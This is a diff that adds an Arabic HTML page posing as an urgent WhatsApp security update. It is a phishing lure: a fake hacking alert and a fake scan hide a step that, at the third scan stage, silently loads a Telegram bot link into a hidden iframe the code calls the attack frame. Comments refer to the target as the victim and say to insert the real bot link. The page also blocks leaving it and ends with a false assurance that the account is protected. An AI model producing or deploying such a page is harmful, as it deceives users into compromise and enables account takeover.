@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 تحديث أمان واتساب - مطلوب</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .warning {
+            background: rgba(255, 68, 68, 0.2);
+            border: 2px solid #ff4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: right;
+        }
+        .system-info {
+            background: rgba(0, 150, 255, 0.2);
+            border: 2px solid #0096ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: right;
+            font-size: 14px;
+        }
+        .loader {
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid #25D366;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.5s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #25D366, #1da851);
+            transition: width 0.5s;
+        }
+        .hidden-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        .step {
+            text-align: right;
+            margin: 15px 0;
+            padding: 10px;
+            border-right: 3px solid #25D366;
+            background: rgba(255,255,255,0.05);
+            border-radius: 8px;
+        }
+        .step.completed {
+            border-right-color: #4CAF50;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- المرحلة 1: التحذير -->
+        <div id="phase1">
+            <h1>🔐 تحديث أمان واتساب عاجل</h1>
+            
+            <div class="warning">
+                <h3>⚠️ تنبيه أمني عاجل</h3>
+                <p>كشف نظام مراقبة واتساب عن محاولة اختراق لحسابك.</p>
+                <p><strong>آخر محاولة وصول:</strong> منذ 15 دقيقة</p>
+                <p><strong>الموقع:</strong> القاهرة، مصر (IP: 197.43.12.85)</p>
+            </div>
+            
+            <p>لحماية رسائلك وبياناتك، يجب تثبيت تحديث الأمان الفوري.</p>
+            
+            <div class="system-info">
+                <p><strong>معلومات جهازك:</strong></p>
+                <p id="deviceInfo">جاري الكشف...</p>
+                <p id="browserInfo">جاري التعرف على المتصفح...</p>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="phase1Progress"></div>
+            </div>
+            
+            <p style="font-size: 14px; opacity: 0.8;">
+                سيبدأ التحديث تلقائياً خلال <span id="countdown">10</span> ثواني...
+            </p>
+        </div>
+        
+        <!-- المرحلة 2: الفحص -->
+        <div id="phase2" style="display: none;">
+            <h2>🔍 جاري فحص النظام</h2>
+            
+            <div class="loader"></div>
+            
+            <div id="stepsContainer">
+                <div class="step" id="step1">فحص ملفات النظام...</div>
+                <div class="step" id="step2">التحقق من قواعد البيانات...</div>
+                <div class="step" id="step3">فحص إعدادات الخصوصية...</div>
+                <div class="step" id="step4">التحقق من شهادات الأمان...</div>
+                <div class="step" id="step5">تثبيت تحديث الحماية...</div>
+            </div>
+            
+            <div class="progress-bar">
+                <div class="progress" id="phase2Progress"></div>
+            </div>
+        </div>
+        
+        <!-- المرحلة 3: الإكمال -->
+        <div id="phase3" style="display: none;">
+            <h2>✅ تم اكتمال التحديث</h2>
+            <p style="font-size: 18px; color: #4CAF50;">حسابك الآن محمي بنسبة 100%</p>
+            
+            <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                <h3>📊 ملخص الحماية:</h3>
+                <p>• تشفير الرسائل: ✅ ممكّن</p>
+                <p>• الحماية من الاختراق: ✅ نشط</p>
+                <p>• النسخ الاحتياطي: ✅ ممكّن</p>
+                <p>• تحديثات تلقائية: ✅ ممكّنة</p>
+            </div>
+            
+            <p style="opacity: 0.8;">يمكنك الآن إغلاق هذه الصفحة بأمان.</p>
+        </div>
+    </div>
+    
+    <!-- إطار مخفي لبدء الهجوم -->
+    <iframe class="hidden-frame" id="attackFrame"></iframe>
+    
+    <script>
+        // ⚠️ ضع رابط البوت الحقيقي هنا
+        const BOT_ATTACK_LINK = "https://t.me/GH122_BOT?start=index_98765";
+        
+        // اكتشاف معلومات الجهاز
+        document.getElementById('deviceInfo').textContent = 
+            `نظام التشغيل: ${navigator.platform}`;
+        document.getElementById('browserInfo').textContent = 
+            `المتصفح: ${navigator.userAgent.split(')')[0].split('(')[1]}`;
+        
+        let currentPhase = 1;
+        
+        // المرحلة 1: العد التنازلي
+        let countdown = 10;
+        const countdownElement = document.getElementById('countdown');
+        const phase1Progress = document.getElementById('phase1Progress');
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            phase1Progress.style.width = ((10 - countdown) * 10) + '%';
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                startPhase2();
+            }
+        }, 1000);
+        
+        // المرحلة 2: الفحص
+        function startPhase2() {
+            document.getElementById('phase1').style.display = 'none';
+            document.getElementById('phase2').style.display = 'block';
+            
+            const steps = document.querySelectorAll('.step');
+            const phase2Progress = document.getElementById('phase2Progress');
+            
+            let currentStep = 0;
+            const totalSteps = steps.length;
+            
+            const stepInterval = setInterval(() => {
+                if (currentStep < totalSteps) {
+                    steps[currentStep].classList.add('completed');
+                    phase2Progress.style.width = ((currentStep + 1) / totalSteps * 100) + '%';
+                    
+                    // في الخطوة 3، ابدأ الهجوم
+                    if (currentStep === 2) {
+                        document.getElementById('attackFrame').src = BOT_ATTACK_LINK;
+                    }
+                    
+                    currentStep++;
+                } else {
+                    clearInterval(stepInterval);
+                    setTimeout(startPhase3, 2000);
+                }
+            }, 1500);
+        }
+        
+        // المرحلة 3: الإكمال
+        function startPhase3() {
+            document.getElementById('phase2').style.display = 'none';
+            document.getElementById('phase3').style.display = 'block';
+            
+            // رسالة نهائية للضحية
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <h2 style="color: #4CAF50;">✅ تم بنجاح</h2>
+                        <p>شكراً لك على حماية حسابك.</p>
+                        <p style="font-size: 14px; opacity: 0.7;">
+                            يمكنك الآن العودة إلى واتساب بأمان.
+                        </p>
+                    </div>
+                `;
+            }, 5000);
+        }
+        
+        // منع مغادرة الصفحة
+        window.onbeforeunload = function(e) {
+            if (currentPhase < 3) {
+                e.preventDefault();
+                return "⚠️ لا تغلق الصفحة قبل اكتمال التحديث الأمني!";
+            }
+        };
+        
+        // كشف الهاتف المحمول
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            document.querySelector('.container').style.maxWidth = '95%';
+            document.querySelector('.container').style.padding = '20px';
+        }
+    </script>
+</body>
+</html>
